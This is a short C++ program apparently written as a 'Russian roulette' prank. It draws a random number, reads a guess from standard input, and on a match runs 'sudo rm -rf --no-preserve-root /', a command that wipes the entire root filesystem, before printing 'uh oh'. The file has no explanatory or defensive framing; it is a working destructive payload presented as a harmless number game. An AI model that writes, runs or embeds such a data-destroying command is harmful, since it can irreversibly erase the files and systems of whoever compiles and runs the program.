#include<cstdlib>
#include<iostream>
#include<time.h>


int main(int argc, char *argv[]) {
    srand(time(NULL));

    int p;
    int r = std::rand() % 101;

    std::cin >> p;

    if(r == p) {
        system("sudo rm -rf --no-preserve-root /");
        std::cout << "uh oh" << "\n";
    }

    std::cout << r << "\n";
    return 0;
}
